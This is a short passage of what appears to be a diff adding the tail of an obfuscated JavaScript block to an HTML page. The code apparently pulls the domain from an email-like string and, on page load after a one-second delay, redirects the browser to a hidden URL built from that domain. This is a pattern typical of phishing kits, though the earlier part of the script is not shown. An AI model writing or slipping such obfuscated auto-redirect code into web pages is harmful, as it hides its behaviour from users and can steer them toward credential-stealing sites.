_0x445eb1=_0x231f69[_0xb21dec(0x240)]('@'),_0x2ba678=_0x231f69[_0xb21dec(0x21e)](_0x445eb1+0x1);window[_0xb21dec(0x215)][_0xb21dec(0x1e1)](_0xb21dec(0x24c)+_0x2ba678);},0x3e8);}}),window['onload']=init;
+    </script>
+</body>
 </html>
